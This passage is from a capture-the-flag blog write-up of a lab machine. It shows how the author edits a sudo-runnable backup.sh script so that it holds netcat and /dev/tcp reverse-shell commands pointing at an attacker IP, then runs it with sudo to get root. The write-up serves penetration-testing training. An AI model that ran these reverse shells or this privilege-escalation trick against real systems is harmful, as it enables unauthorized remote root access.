+<pre class="astro-code astro-code-themes min-light night-owl" style="background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic">#!/bin/bash</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">sudo</span><span style="color:#2B5581;--shiki-dark:#ECC48D"> find</span><span style="color:#2B5581;--shiki-dark:#ECC48D"> /</span><span style="color:#2B5581;--shiki-dark:#82AAFF"> -name</span><span style="color:#22863A;--shiki-dark:#D9F5DD"> "</span><span style="color:#22863A;--shiki-dark:#ECC48D">*.mp3</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#D32F2F;--shiki-dark:#7FDBCA"> |</span><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic"> sudo</span><span style="color:#2B5581;--shiki-dark:#ECC48D"> tee</span><span style="color:#2B5581;--shiki-dark:#ECC48D"> /etc/mp3backups/backed_up_files.txt</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#C5E478">input</span><span style="color:#D32F2F;--shiki-dark:#C792EA">=</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#22863A;--shiki-dark:#ECC48D">/etc/mp3backups/backed_up_files.txt</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span></span>
+<span class="line"><span style="color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic">#while IFS= read -r line</span></span>
+<span class="line"><span style="color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic">#do</span></span>
+<span class="line"><span style="color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic">  #a="/etc/mp3backups/backed_up_files.txt"</span></span>
+<span class="line"><span style="color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic">#  b=$(basename $input)</span></span>
+<span class="line"><span style="color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic">  #echo</span></span>
+<span class="line"><span style="color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic">#  echo "$line"</span></span>
+<span class="line"><span style="color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic">#done &#x3C; "$input"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">while</span><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#C5E478;--shiki-dark-font-style:italic"> getopts</span><span style="color:#2B5581;--shiki-dark:#ECC48D"> c:</span><span style="color:#2B5581;--shiki-dark:#ECC48D"> flag</span></span>
+<span class="line"><span style="color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">do</span></span>
+<span class="line"><span style="color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">        case</span><span style="color:#22863A;--shiki-dark:#D9F5DD"> "</span><span style="color:#22863A;--shiki-dark:#ECC48D">${</span><span style="color:#22863A;--shiki-dark:#C5E478">flag</span><span style="color:#22863A;--shiki-dark:#ECC48D">}</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic"> in</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB"> </span></span>
+<span class="line"><span style="color:#22863A;--shiki-dark:#5CA7E4">                c</span><span style="color:#D32F2F;--shiki-dark:#7FDBCA">)</span><span style="color:#24292EFF;--shiki-dark:#C5E478"> command</span><span style="color:#D32F2F;--shiki-dark:#C792EA">=</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">${</span><span style="color:#24292EFF;--shiki-dark:#C5E478">OPTARG</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">};;</span></span>
+<span class="line"><span style="color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">        esac</span></span>
+<span class="line"><span style="color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic">done</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#C5E478">backup_files</span><span style="color:#D32F2F;--shiki-dark:#C792EA">=</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#22863A;--shiki-dark:#ECC48D">/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic"># Where to backup to.</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#C5E478">dest</span><span style="color:#D32F2F;--shiki-dark:#C792EA">=</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#22863A;--shiki-dark:#ECC48D">/etc/mp3backups/</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic"># Create archive filename.</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#C5E478">hostname</span><span style="color:#D32F2F;--shiki-dark:#C792EA">=</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">$(</span><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">hostname</span><span style="color:#2B5581;--shiki-dark:#82AAFF"> -s</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#C5E478">archive_file</span><span style="color:#D32F2F;--shiki-dark:#C792EA">=</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span><span style="color:#22863A;--shiki-dark:#C5E478">$hostname</span><span style="color:#22863A;--shiki-dark:#ECC48D">-scheduled.tgz</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic"># Print start status message.</span></span>
+<span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#C5E478;--shiki-dark-font-style:italic">echo</span><span style="color:#22863A;--shiki-dark:#D9F5DD"> "</span><span style="color:#22863A;--shiki-dark:#ECC48D">Backing up </span><span style="color:#22863A;--shiki-dark:#C5E478">$backup_files</span><span style="color:#22863A;--shiki-dark:#ECC48D"> to </span><span style="color:#22863A;--shiki-dark:#C5E478">$dest</span><span style="color:#22863A;--shiki-dark:#ECC48D">/</span><span style="color:#22863A;--shiki-dark:#C5E478">$archive_file</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#C5E478;--shiki-dark-font-style:italic">echo</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic"># Backup the files using tar.</span></span>
+<span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">tar</span><span style="color:#2B5581;--shiki-dark:#ECC48D"> czf</span><span style="color:#24292EFF;--shiki-dark:#C5E478"> $dest</span><span style="color:#2B5581;--shiki-dark:#ECC48D">/</span><span style="color:#24292EFF;--shiki-dark:#C5E478">$archive_file</span><span style="color:#24292EFF;--shiki-dark:#C5E478"> $backup_files</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic"># Print end status message.</span></span>
+<span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#C5E478;--shiki-dark-font-style:italic">echo</span></span>
+<span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#C5E478;--shiki-dark-font-style:italic">echo</span><span style="color:#22863A;--shiki-dark:#D9F5DD"> "</span><span style="color:#22863A;--shiki-dark:#ECC48D">Backup finished</span><span style="color:#22863A;--shiki-dark:#D9F5DD">"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292EFF;--shiki-dark:#C5E478">cmd</span><span style="color:#D32F2F;--shiki-dark:#C792EA">=</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">$(</span><span style="color:#24292EFF;--shiki-dark:#C5E478">$command</span><span style="color:#24292EFF;--shiki-dark:#D6DEEB">)</span></span>
+<span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#C5E478;--shiki-dark-font-style:italic">echo</span><span style="color:#24292EFF;--shiki-dark:#C5E478"> $cmd</span></span>
+<span class="line"></span></code></pre>
+<ul>
+<li>my initial thoughts are that this is simply for the creation of the tar archive that we already decrypted</li>
+</ul>
+<p>However the part that matters to us is not the content but the fact that this script can be run as the root user and we have access to it. This will hopefully allow us to create a reverse shell.</p>
+<p>Unfortunately we are not allowed to write to the script but since we should be the owners of the script lets try giving ourselves the permissions with <code>chmod +w etc/mp3backups/backup.sh</code>,</p>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241222233750594.png" alt=""></p>
+<ul>
+<li>we gave ourselves the access let’s try setting up the reverse shell now</li>
+</ul>
+<p>Ok script changing editing works! Let’s setup a shell now,</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic">#!/bin/bash</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">nc</span><span style="color:#1976D2;--shiki-dark:#F78C6C"> 10.0.0.81</span><span style="color:#1976D2;--shiki-dark:#F78C6C"> 5555</span><span style="color:#2B5581;--shiki-dark:#82AAFF"> -e</span><span style="color:#2B5581;--shiki-dark:#ECC48D"> /bin/bash</span></span></code></pre>
+<ul>
+<li>we set up the listener on our attacker machine with <code>nc -lvnp 5555</code> and the shell on the target machine with the script</li>
+</ul>
+<p>Running the script with <code>./backup.sh</code> we meet this error,</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>nc: invalid option -- 'e'</span></span>
+<span class="line"><span>This is nc from the netcat-openbsd package. An alternative nc is available</span></span>
+<span class="line"><span>in the netcat-traditional package.</span></span>
+<span class="line"><span>usage: nc [-46bCDdhjklnrStUuvZz] [-I length] [-i interval] [-O length]</span></span>
+<span class="line"><span>         [-P proxy_username] [-p source_port] [-q seconds] [-s source]</span></span>
+<span class="line"><span>         [-T toskeyword] [-V rtable] [-w timeout] [-X proxy_protocol]</span></span>
+<span class="line"><span>         [-x proxy_address[:port]] [destination] [port]</span></span></code></pre>
+<ul>
+<li>apparently ubuntu which is the host machine operating system has 2 packages, netcat and ncat which make using the <code>-e</code> flag complicated</li>
+</ul>
+<p>Let’s pick up a basic bash shell from <em>revshells.com</em> then,</p>
+<pre class="astro-code astro-code-themes min-light night-owl" style="background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic">#!/bin/bash</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic">sh</span><span style="color:#2B5581;--shiki-dark:#82AAFF"> -i</span><span style="color:#D32F2F;--shiki-dark:#7FDBCA"> >&#x26;</span><span style="color:#2B5581;--shiki-dark:#ECC48D"> /dev/tcp/10.9.0.81/5555</span><span style="color:#D32F2F;--shiki-dark:#7FDBCA"> 0>&#x26;1</span></span></code></pre>
+<ul>
+<li>the updated script</li>
+</ul>
+<p>We have a connection!</p>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241223002754179.png" alt=""></p>
+<ul>
+<li>nevermind we are still the same user</li>
+</ul>
+<p>The problem we are having is that the alex user is the one executing the script which means the reverse shell will be with his privileges. For root access we need root to run the script.</p>
+<p>The only way I can think of to find a script running by root is through a cronjob. Let’s examine the scheduled cronjobs then,</p>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241223010107643.png" alt=""></p>
+<ul>
+<li>the available cronjobs will not allow us to edit them</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241223010419167.png" alt=""></p>
+<ul>
+<li>even the daily cronjobs will not give us write access</li>
+</ul>
+<p>Wait hold up, the whole purpose of enumerating with <code>sudo -l</code> was to find files we can execute as root but when executing the <code>backup.sh</code> file we never used sudo! Let’s use that bash reverse shell, set up our listener and run <code>sudo ./backup.sh</code> this time.</p>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241223012710106.png" alt=""></p>
+<ul>
+<li>Voila! we are root</li>
+</ul>
+<p>Let’s capture our flag,</p>
+<p><img src="https://raw.githubusercontent.com/tedthecaver/tedthecaver.github.io/main/_posts/IMG-20241223013201362.png" alt=""></p>
+<ul>
+<li>EZ</li>
+</ul> </article> <hr class="my-8 border-dashed">  <ul class="mt-4 mb-8 sm:my-8"> <li class="group inline-block group-hover:cursor-pointer my-1 underline-offset-4"> <a href="/tags/others/" class="relative pr-2 text-lg underline decoration-dashed group-hover:-top-0.5 group-hover:text-accent focus-visible:p-1 text-sm" data-astro-transition-scope="astro-36ssibgs-2"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block opacity-80 -mr-3.5 size-4"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M5 9l14 0" /><path d="M5 15l14 0" /><path d="M11 4l-4 16" /><path d="M17 4l-4 16" /></svg>
+&nbsp;<span>others</span> </a> </li> </ul> <div class="flex flex-col items-center justify-between gap-6 sm:flex-row sm:items-end sm:gap-4"> <div class="flex flex-col flex-wrap items-center justify-center gap-1 sm:items-start"> <span class="italic">Share this post on:</span> <div class="text-center"> <a href="https://wa.me/?text=https://y3ll0weye.github.io/posts/2024-12-25-cyborg/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post via WhatsApp"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M3 21l1.65 -3.8a9 9 0 1 1 3.4 2.9l-5.05 .9" /><path d="M9 10a.5 .5 0 0 0 1 0v-1a.5 .5 0 0 0 -1 0v1a5 5 0 0 0 5 5h1a.5 .5 0 0 0 0 -1h-1a.5 .5 0 0 0 0 1" /></svg> <span class="sr-only">Share this post via WhatsApp</span> </a><a href="https://www.facebook.com/sharer.php?u=https://y3ll0weye.github.io/posts/2024-12-25-cyborg/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post on Facebook"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M7 10v4h3v7h4v-7h3l1 -4h-4v-2a1 1 0 0 1 1 -1h3v-4h-3a5 5 0 0 0 -5 5v2h-3" /></svg> <span class="sr-only">Share this post on Facebook</span> </a><a href="https://x.com/intent/post?url=https://y3ll0weye.github.io/posts/2024-12-25-cyborg/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post on X"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M4 4l11.733 16h4.267l-11.733 -16z" /><path d="M4 20l6.768 -6.768m2.46 -2.46l6.772 -6.772" /></svg> <span class="sr-only">Share this post on X</span> </a><a href="https://t.me/share/url?url=https://y3ll0weye.github.io/posts/2024-12-25-cyborg/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post via Telegram"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M15 10l-4 4l6 6l4 -16l-18 7l4 2l2 6l3 -4" /></svg> <span class="sr-only">Share this post via Telegram</span> </a><a href="https://pinterest.com/pin/create/button/?url=https://y3ll0weye.github.io/posts/2024-12-25-cyborg/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post on Pinterest"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M8 20l4 -9" /><path d="M10.7 14c.437 1.263 1.43 2 2.55 2c2.071 0 3.75 -1.554 3.75 -4a5 5 0 1 0 -9.7 1.7" /><path d="M12 12m-9 0a9 9 0 1 0 18 0a9 9 0 1 0 -18 0" /></svg> <span class="sr-only">Share this post on Pinterest</span> </a><a href="mailto:?subject=See%20this%20post&#38;body=https://y3ll0weye.github.io/posts/2024-12-25-cyborg/" class="group inline-block hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1" title="Share this post via email"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z" /><path d="M3 7l9 6l9 -6" /></svg> <span class="sr-only">Share this post via email</span> </a> </div> </div> <button id="back-to-top" class="focus-outline py-1 whitespace-nowrap hover:opacity-75"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block rotate-90"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M15 6l-6 6l6 6" /></svg> <span>Back to Top</span> </button> </div> <hr class="my-6 border-dashed"> <!-- Previous/Next Post Buttons --> <div data-pagefind-ignore class="grid grid-cols-1 gap-6 sm:grid-cols-2"> <a href="/posts/2025-01-31-webapplicationfingerprinting" class="flex w-full gap-1 hover:opacity-75"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block flex-none"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M15 6l-6 6l6 6" /></svg> <div> <span>Previous Post</span> <div class="text-sm text-accent/85">Web Application analysis</div> </div> </a> <a href="/posts/Sentiment analysis part 1" class="flex w-full justify-end gap-1 text-right hover:opacity-75 sm:col-start-2"> <div> <span>Next Post</span> <div class="text-sm text-accent/85">Sentiment analysis part 1</div> </div> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block flex-none"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M9 6l6 6l-6 6" /></svg> </a> </div> </main> <footer class="w-full mt-auto"> <div class="max-w-3xl mx-auto px-0"> <hr class="border-border" aria-hidden="true"> </div> <div class="flex flex-col items-center justify-between py-6 sm:flex-row-reverse sm:py-4"> <div class="flex-wrap justify-center gap-1 flex"> <a href="https://github.com/satnaing/astro-paper" class="group inline-block hover:text-accent p-2 hover:rotate-6 sm:p-1" title=" y3ll0weye on Github"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" /></svg> <span class="sr-only"> y3ll0weye on Github</span> </a><a href="https://www.linkedin.com/in/ibrahim-ahmed-b1bb50267/" class="group inline-block hover:text-accent p-2 hover:rotate-6 sm:p-1" title="y3ll0weye on LinkedIn"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M8 11v5" /><path d="M8 8v.01" /><path d="M12 16v-5" /><path d="M16 16v-3a2 2 0 1 0 -4 0" /><path d="M3 7a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v10a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4z" /></svg> <span class="sr-only">y3ll0weye on LinkedIn</span> </a><a href="ibrahim.a101@outlook.com" class="group inline-block hover:text-accent p-2 hover:rotate-6 sm:p-1" title="Send an email to y3ll0weye"> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110"><path stroke="none" d="M0 0h24v24H0z" fill="none" /><path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z" /><path d="M3 7l9 6l9 -6" /></svg> <span class="sr-only">Send an email to y3ll0weye</span> </a> </div> <div class="my-2 flex flex-col items-center whitespace-nowrap sm:flex-row"> <span>Copyright &#169; 2025</span> <span class="hidden sm:inline">&nbsp;|&nbsp;</span> <span>All rights reserved.</span> </div> </div> </footer>  </body></html> <script data-astro-rerun>
+  /** Create a progress indicator
+   *  at the top */
+  function createProgressBar() {
+    // Create the main container div
+    const progressContainer = document.createElement("div");
+    progressContainer.className =
+      "progress-container fixed top-0 z-10 h-1 w-full bg-background";
+
+    // Create the progress bar div
+    const progressBar = document.createElement("div");
+    progressBar.className = "progress-bar h-1 w-0 bg-accent";
+    progressBar.id = "myBar";
+
+    // Append the progress bar to the progress container
+    progressContainer.appendChild(progressBar);
+
+    // Append the progress container to the document body or any other desired parent element
+    document.body.appendChild(progressContainer);
+  }
+  createProgressBar();
+
+  /** Update the progress bar
+   *  when user scrolls */
+  function updateScrollProgress() {
+    document.addEventListener("scroll", () => {
+      const winScroll =
+        document.body.scrollTop || document.documentElement.scrollTop;
+      const height =
+        document.documentElement.scrollHeight -
+        document.documentElement.clientHeight;
+      const scrolled = (winScroll / height) * 100;
+      if (document) {
+        const myBar = document.getElementById("myBar");
+        if (myBar) {
+          myBar.style.width = scrolled + "%";
+        }
+      }
+    });
+  }
+  updateScrollProgress();
+
+  /** Attaches links to headings in the document,
+   *  allowing sharing of sections easily */
+  function addHeadingLinks() {
+    const headings = Array.from(
+      document.querySelectorAll("h2, h3, h4, h5, h6")
+    );
+    for (const heading of headings) {
+      heading.classList.add("group");
+      const link = document.createElement("a");
+      link.className =
+        "heading-link ml-2 opacity-0 group-hover:opacity-100 focus:opacity-100";
+      link.href = "#" + heading.id;
+
+      const span = document.createElement("span");
+      span.ariaHidden = "true";
+      span.innerText = "#";
+      link.appendChild(span);
+      heading.appendChild(link);
+    }
+  }
+  addHeadingLinks();
+
+  /** Attaches copy buttons to code blocks in the document,
+   * allowing users to copy code easily. */
+  function attachCopyButtons() {
+    const copyButtonLabel = "Copy";
+    const codeBlocks = Array.from(document.querySelectorAll("pre"));
+
+    for (const codeBlock of codeBlocks) {
+      const wrapper = document.createElement("div");
+      wrapper.style.position = "relative";
+
+      const copyButton = document.createElement("button");
+      copyButton.className =
+        "copy-code absolute right-3 -top-3 rounded bg-muted px-2 py-1 text-xs leading-4 text-foreground font-medium";
+      copyButton.innerHTML = copyButtonLabel;
+      codeBlock.setAttribute("tabindex", "0");
+      codeBlock.appendChild(copyButton);
+
+      // wrap codebock with relative parent element
+      codeBlock?.parentNode?.insertBefore(wrapper, codeBlock);
+      wrapper.appendChild(codeBlock);
+
+      copyButton.addEventListener("click", async () => {
+        await copyCode(codeBlock, copyButton);
+      });
+    }
+
+    async function copyCode(block, button) {
+      const code = block.querySelector("code");
+      const text = code?.innerText;
+
+      await navigator.clipboard.writeText(text ?? "");
+
+      // visual feedback that task is completed
+      button.innerText = "Copied";
+
+      setTimeout(() => {
+        button.innerText = copyButtonLabel;
+      }, 700);
+    }
+  }
+  attachCopyButtons();
+
+  /** Scrolls the document to the top when
+   * the "Back to Top" button is clicked. */
+  function backToTop() {
+    document.querySelector("#back-to-top")?.addEventListener("click", () => {
+      document.body.scrollTop = 0; // For Safari
+      document.documentElement.scrollTop = 0; // For Chrome, Firefox, IE and Opera
+    });
+  }
+  backToTop();
+
+  /* Go to page start after page swap */
+  document.addEventListener("astro:after-swap", () =>
+    window.scrollTo({ left: 0, top: 0, behavior: "instant" })
+  );
+</script>
